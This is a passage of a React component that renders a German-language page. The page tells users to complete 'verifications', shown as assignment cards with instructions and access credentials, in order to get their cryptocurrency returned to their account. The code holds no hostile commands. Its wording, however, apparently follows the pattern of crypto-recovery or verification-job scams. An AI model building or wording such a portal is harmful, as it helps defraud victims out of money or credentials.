              Bitte führen Sie die folgenden Verifikationen durch, um Ihre Kryptowährungen sicher auf Ihr Konto zurückzuführen.<br className="hidden sm:inline" />
              Klicken Sie auf einen Auftrag, um die Anleitung und Zugangsdaten einzusehen.
            </p>
          </div>

          {/* Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4 pb-10 sm:pb-16 opacity-0 animate-fade-in" style={{ animationDelay: "150ms", animationFillMode: "forwards" }}>
            {/* Real assignments */}
            {assignments.map((a) => (
              <Card
                key={a.id}
                onClick={() => setSelectedId(a.id)}
                className="border-slate-200 bg-white shadow-sm cursor-pointer transition-all duration-200 hover:border-[#0b1f3a]/40 hover:shadow-md hover:shadow-[#0b1f3a]/10 group"
              >
                <CardContent className="p-0 aspect-square flex flex-col items-center justify-center text-center gap-2 sm:gap-3 px-3 sm:px-4">
                  <VerificationLogo
                    value={a.verification?.logo_url ?? null}
                    alt={a.verification?.title ?? ""}
                    className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl object-contain bg-slate-50 border border-slate-200 p-2 transition-transform duration-200 group-hover:scale-105"
                    fallback={
                      <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-slate-50 border border-slate-200 flex items-center justify-center">
                        <span className="text-xl font-bold text-slate-400">{(a.verification?.title ?? "A").charAt(0)}</span>
                      </div>
                    }
                  />
                  <div className="space-y-1 sm:space-y-1.5 w-full">
                    <p className="text-xs sm:text-sm font-semibold text-[#0b1f3a] line-clamp-2 max-w-full leading-snug">
                      {a.verification?.title ?? "Auftrag"}
                    </p>
                    <AssignmentStatusBadge status={a.status} />
                  </div>
                </CardContent>
              </Card>
            ))}

            {/* Placeholder cards */}
            {PLACEHOLDER_CARDS.map((p, i) => (
              <div
                key={`placeholder-${i}`}
                className="aspect-square rounded-lg border-2 border-dashed border-slate-200 flex flex-col items-center justify-center text-center gap-2 px-4"
              >
                <Lock className="w-5 h-5 text-slate-300" />
                <p className="text-xs font-medium text-slate-400">
                  {p.label}
                </p>
              </div>
            ))}
          </div>

        </main>
      )}
          </div>
        </div>
      </div>
    </div>
  );
}
